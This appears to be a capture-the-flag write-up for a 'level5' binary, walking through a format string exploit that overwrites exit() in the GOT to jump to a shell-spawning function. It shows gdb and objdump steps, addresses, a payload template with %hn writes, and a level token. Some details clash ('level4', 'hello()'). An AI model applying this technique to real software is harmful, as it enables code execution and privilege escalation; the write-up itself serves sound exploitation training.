# Level5 - Format string vulnerability - Code redirection with GOT Overwrite

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level5 | `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a` |
| level6 | ``                                                                 |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

Execute level4

```shell
./level4
(stdin) abcdef
> abcdef
```

Seems to be like previous levels.

Lets debug the binary

```shell
(gdb) info functions

> (...)
  0x080484a4  o
  0x080484c2  n
  0x08048504  main
  (...)
```

```shell
gdb-peda$ pdisas main
# (...)
gdb-peda$ pdisas o
# (...)

gdb-peda$ pdisas n
```

We need to call `o`-function that creates a new shell.

n() calls exit(1) at the end of his routine. It means that we never return to main() ! So, what do we do now ? Well, we’ll use a trick called GOT Overwrite.

Basically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like libc functions). By doing so, the executable will cache the memory address in the GOT, so that it doesn’t have to ask libc each time an external function is called.

The goal here will be to overwrite the address of exit() in the GOT with the address of hello(). There are 4 steps here :

- Find the address of o()
- Find the address of exit() in GOT
- Find the offset of our string on the stack
- Write the proper exploit string

Let’s find the address of exit() and o()

```shell
# Get exit-syscall address
objdump -R ~/level5 | grep exit
> 08049828 R_386_JUMP_SLOT   _exit
  08049838 R_386_JUMP_SLOT   exit

# Get o-function address
objdump -t ~/level5 | grep -w o
> 080484a4 g     F .text  0000001e              o
```

It means we want to write the value `0x080484a4` at the address of exit: `0x08049838`

We need to know the buffer address.

```bash
gdb-peda$ b *p+54 # just after printf
gdb-peda$ run <<< AAAA
[------------------------------------stack-------------------------------------]
0000| 0xbffff430 --> 0xbffff440 ("AAAA\n")
0004| 0xbffff434 --> 0x200
0008| 0xbffff438 --> 0xb7fd1ac0 --> 0xfbad2088
0012| 0xbffff43c --> 0xb7ff37d0 (<__libc_memalign+16>:  add    ebx,0xb824)
0016| 0xbffff440 ("AAAA\n")
[------------------------------------------------------------------------------]
```

The buffer pointer is 4 addresses before the printf argument.

As `0x080484a4` is a big value, instead of print this value, we will split this integer with two short integers:

- High-order bytes: `0x0804`
- Low-order bytes: `0x84a4`

Basically, our format string should be something like:

```
   ______________________________________
   |                                    |
ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %4$hn +  %<VALUE_2>x + %5$hn
                |______________________________________________|

```

---

## Sources

### Format string vulnerability

- [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)
- [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/)

### Shell

- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man system](https://linux.die.net/man/3/system)
- [Man exit](https://linux.die.net/man/3/exit)
- [Man \_exit](https://linux.die.net/man/2/_exit)
